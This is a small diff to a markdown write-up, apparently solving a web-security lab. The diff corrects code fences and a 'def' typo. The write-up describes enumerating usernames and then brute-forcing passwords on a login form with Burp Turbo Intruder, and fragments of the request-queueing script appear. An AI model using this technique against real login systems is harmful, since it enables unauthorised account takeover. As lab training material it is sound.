@@ -119,8 +119,8 @@
 
 # My Solution
 - I sent the log in request to burp turbo intruder and I Highlighted the username and used the following code
-```
-ef queueRequests(target, wordlists):
+```python
+def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
@@ -137,8 +137,8 @@ def handleResponse(req, interesting):
         table.add(req)
 ```
 - After I got the Username when the error message said invalid password, I sent the request to repeater and I highlighted the password and sent it to burp turbo intruder once again using the same code but now with a password list
-```
-ef queueRequests(target, wordlists):
+```python
+def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
